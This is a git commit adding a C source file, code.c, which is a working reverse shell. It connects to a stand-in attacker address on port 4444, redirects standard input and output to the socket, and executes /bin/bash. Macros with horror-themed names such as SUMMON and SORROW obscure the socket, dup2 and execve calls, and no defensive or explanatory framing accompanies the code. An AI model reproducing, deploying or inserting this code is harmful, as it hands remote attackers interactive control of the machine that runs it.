5fee45f82c940fa72d676ec2d971e5ee01ef164d
void's cry <237899578+voids-cry@users.noreply.github.com>
2026-01-16 02:45:13 +0900

    created

---
+++ code.c
@@ -0,0 +1,42 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+#define LHOST "13.13.666.666"
+#define LPORT 4444
+
+#define NIGHTMARE main
+#define BOTTOMLESS_PIT socket
+#define SLY_VAMPIRE htons
+#define SACRIFICE inet_addr
+#define SORROW connect
+#define DOOM dup2
+#define CEMETERY close
+#define SUMMON execve
+
+int NIGHTMARE(void) {
+
+    int sockfd;
+    struct sockaddr_in reaper;
+
+    sockfd = BOTTOMLESS_PIT(AF_INET, SOCK_STREAM, 0);
+    reaper.sin_family = AF_INET;
+    reaper.sin_port = SLY_VAMPIRE(LPORT);
+    reaper.sin_addr.s_addr = SACRIFICE(LHOST);
+
+    SORROW(sockfd, (struct sockaddr*)&reaper, sizeof(reaper));
+
+    DOOM(sockfd, 0);
+    DOOM(sockfd, 1);
+    DOOM(sockfd, 2);
+
+    CEMETERY(sockfd);
+
+    char *argv[] = {"/bin/bash", NULL};
+    SUMMON(argv[0], argv, NULL);
+
+    return 0;
+
+}
